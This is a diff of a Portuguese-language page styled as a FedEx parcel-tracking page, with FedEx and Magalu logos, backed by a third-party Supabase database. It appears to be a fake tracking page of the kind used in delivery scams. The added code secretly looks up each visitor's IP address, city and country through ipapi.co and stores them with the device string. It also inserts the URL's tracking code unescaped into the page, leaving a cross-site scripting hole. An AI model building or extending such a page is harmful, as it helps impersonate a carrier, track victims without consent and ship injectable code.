@@ -1,169 +1,359 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
+
 <head>
+
 <meta charset="UTF-8">
-<title>Rastreamento</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>FedEx - Rastreamento</title>
+
+<link rel="stylesheet" href="/css/style.css">
 
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
 <style>
 
-body{
-font-family:Arial;
-background:#f5f7fb;
-padding:40px;
+.horarioBtn{
+padding:8px 12px;
+margin:5px;
+border:none;
+border-radius:6px;
+background:#ff6a00;
+color:white;
+cursor:pointer;
 }
 
-.card{
-background:white;
-padding:20px;
-border-radius:10px;
-box-shadow:0 0 10px rgba(0,0,0,0.1);
-max-width:700px;
-margin:auto;
+.horarioBtn:hover{
+opacity:0.9;
 }
 
-.modal{
+</style>
+
+</head>
+
+<body>
+
+<div class="tracking-container">
+
+<div class="tracking-content">
+
+<div class="tracking-main-card">
+
+<div class="tracking-header">
+<div class="tracking-logo">
+<img src="/fedex.png" class="tracking-header-logo">
+</div>
+</div>
+
+<div class="tracking-code-label">
+Seu código de rastreamento
+</div>
+
+<div id="codigo" class="tracking-code"></div>
+
+<div class="tracking-info-section">
+<div class="tracking-info-item">
+<span class="info-label">Destinatário</span>
+<span id="destinatario" class="info-value"></span>
+</div>
+</div>
+
+<div class="tracking-address-section">
+<div class="address-header">
+<span class="address-label">Endereço de Entrega</span>
+</div>
+<div id="endereco" class="address-value"></div>
+</div>
+
+<div class="tracking-update-bar">
+Última atualização em: <span id="atualizacao"></span>
+</div>
+
+</div>
+
+<div class="tracking-help-card">
+
+<div class="help-title">
+Precisa de Ajuda?
+</div>
+
+<button class="help-button support">
+Escolher horário de entrega
+</button>
+
+<button class="help-button faq">
+Perguntas Frequentes
+</button>
+
+</div>
+
+<div id="timeline" class="tracking-timeline"></div>
+
+</div>
+
+<div class="tracking-logos">
+<img src="/fedex.png" class="tracking-logo-fedex">
+<img src="/logo-magalu-azul (1).png" class="tracking-logo-magalu">
+</div>
+
+</div>
+
+
+<!-- MODAL HORARIO ENTREGA -->
+
+<div id="modalHorario" style="
+display:none;
 position:fixed;
 top:0;
 left:0;
 width:100%;
 height:100%;
-background:rgba(0,0,0,0.4);
-display:flex;
+background:rgba(0,0,0,0.5);
 align-items:center;
 justify-content:center;
-}
+z-index:9999;
+">
 
-.modal-box{
+<div style="
 background:white;
 padding:30px;
 border-radius:10px;
+width:320px;
 text-align:center;
-}
-
-.horarios button{
-margin:5px;
-padding:10px 15px;
-background:#ff6a00;
-color:white;
-border:none;
-border-radius:6px;
-cursor:pointer;
-}
-
-</style>
-</head>
-
-<body>
-
-<div class="card">
-
-<h2 id="codigo"></h2>
-
-<p><b>Destinatário:</b> <span id="destinatario"></span></p>
-<p><b>Endereço:</b> <span id="endereco"></span></p>
-
-</div>
-
-<div class="modal" id="modalHorario">
-
-<div class="modal-box">
+box-shadow:0 0 20px rgba(0,0,0,0.2);
+">
 
 <h3>Escolher horário de entrega</h3>
 
-<div class="horarios">
+<p style="font-size:14px;color:#555;">
+Selecione o melhor horário para receber seu pacote
+</p>
 
-<button onclick="escolherHorario('10:00')">10:00</button>
-<button onclick="escolherHorario('11:00')">11:00</button>
-<button onclick="escolherHorario('13:00')">13:00</button>
-<button onclick="escolherHorario('14:00')">14:00</button>
-<button onclick="escolherHorario('15:00')">15:00</button>
-<button onclick="escolherHorario('16:00')">16:00</button>
-<button onclick="escolherHorario('17:00')">17:00</button>
-<button onclick="escolherHorario('18:00')">18:00</button>
-<button onclick="escolherHorario('19:00')">19:00</button>
+<div style="margin-top:20px">
+
+<button class="horarioBtn">10:00</button>
+<button class="horarioBtn">11:00</button>
+<button class="horarioBtn">13:00</button>
+<button class="horarioBtn">14:00</button>
+<button class="horarioBtn">15:00</button>
+<button class="horarioBtn">16:00</button>
+<button class="horarioBtn">17:00</button>
+<button class="horarioBtn">18:00</button>
+<button class="horarioBtn">19:00</button>
 
 </div>
 
 <br>
 
-<button onclick="fechar()">Cancelar</button>
+<button onclick="fecharHorario()" style="
+background:#ccc;
+padding:8px 15px;
+border:none;
+border-radius:6px;
+cursor:pointer;
+">
+Cancelar
+</button>
 
 </div>
 
 </div>
+
 
 <script>
 
 const SUPABASE_URL="https://opiwznepfjcinxrymrxw.supabase.co"
 const SUPABASE_KEY="sb_publishable_F7z4q7UuxxNc13r4rDubZA_LsFF1fEB"
 
-const db=window.supabase.createClient(SUPABASE_URL,SUPABASE_KEY)
+const db = window.supabase.createClient(
+SUPABASE_URL,
+SUPABASE_KEY
+)
 
-const urlParams = new URLSearchParams(window.location.search)
-const code = urlParams.get("code")
+const params = new URLSearchParams(window.location.search)
+const code = params.get("code")
+
+document.getElementById("codigo").innerText = code
+
+
+function formatarDataBrasil(data){
+return new Date(data).toLocaleString("pt-BR",{
+timeZone:"America/Sao_Paulo"
+})
+}
+
+
+// REGISTRAR VISUALIZAÇÃO
+
+async function registrarVisualizacao(code){
+
+try{
+
+const geo = await fetch("https://ipapi.co/json/")
+const geoData = await geo.json()
+
+const device = navigator.userAgent
+
+await db
+.from("tracking_views")
+.insert([
+{
+code:code,
+ip:geoData.ip,
+city:geoData.city,
+country:geoData.country_name,
+device:device
+}
+])
+
+}catch(e){
+
+console.log("erro ao registrar visualização")
+
+}
+
+}
+
+
 
 async function carregar(){
 
-const {data}=await db
+const {data,error} = await db
 .from("trackings_test")
 .select("*")
 .eq("code",code)
 .single()
 
-document.getElementById("codigo").innerText=data.code
-document.getElementById("destinatario").innerText=data.recipient_name
-document.getElementById("endereco").innerText=data.address
+if(error || !data){
 
-registrarView()
+document.getElementById("timeline").innerHTML=`
+
+<div class="tracking-error-message">
+
+<div class="error-icon">⚠️</div>
+
+<div class="error-title">
+Rastreamento não encontrado
+</div>
+
+<p class="error-text">
+O código <strong>${code}</strong> não foi localizado.
+</p>
+
+<p class="error-text">
+Verifique o número e tente novamente.
+</p>
+
+</div>
+
+`
+
+return
+}
+
+
+// REGISTRA VISUALIZAÇÃO
+registrarVisualizacao(code)
+
+
+document.getElementById("destinatario").innerText = data.recipient_name
+document.getElementById("endereco").innerText = data.address
+
+
+const ultimoEvento = data.timeline[data.timeline.length - 1]
+
+document.getElementById("atualizacao").innerText =
+formatarDataBrasil(ultimoEvento.date)
+
+
+const timeline = document.getElementById("timeline")
+
+timeline.innerHTML=""
+
+data.timeline.forEach((evento,index)=>{
+
+timeline.innerHTML+=`
+
+<div class="timeline-item ${index==data.timeline.length-1 ? "active":""}">
+
+<div class="timeline-dot"></div>
+
+<div class="timeline-content">
+
+<div class="timeline-date">
+${formatarDataBrasil(evento.date)}
+</div>
+
+<div class="timeline-status">
+${evento.title}
+</div>
+
+<div class="timeline-description">
+${evento.description}
+</div>
+
+<div class="timeline-location">
+📍 ${evento.location}
+</div>
+
+</div>
+
+</div>
+
+`
+
+})
 
 }
 
-async function registrarView(){
+carregar()
 
-const device=navigator.userAgent
 
-let city=""
 
-try{
+// ABRIR MODAL
 
-const geo=await fetch("https://ipapi.co/json/")
-const geoData=await geo.json()
+document.querySelector(".help-button.support")
+.addEventListener("click",abrirHorario)
 
-city=geoData.city
+function abrirHorario(){
 
-}catch{}
-
-await db.from("tracking_views").insert([{
-code:code,
-device:device,
-city:city,
-viewed_at:new Date().toISOString()
-}])
+document.getElementById("modalHorario").style.display="flex"
 
 }
 
-async function escolherHorario(horario){
+
+// FECHAR
+
+function fecharHorario(){
+
+document.getElementById("modalHorario").style.display="none"
+
+}
+
+
+// SALVAR HORARIO ESCOLHIDO
+
+document.querySelectorAll(".horarioBtn").forEach(btn=>{
+
+btn.onclick=async function(){
+
+const horario=this.innerText
 
 await db
-.from("tracking_views")
+.from("trackings_test")
 .update({
 delivery_time:horario
 })
 .eq("code",code)
 
-alert("Horário escolhido: "+horario)
+alert("Horário de entrega escolhido: "+horario)
 
-location.reload()
+fecharHorario()
 
 }
 
-function fechar(){
-document.getElementById("modalHorario").style.display="none"
-}
-
-carregar()
+})
 
 </script>
 
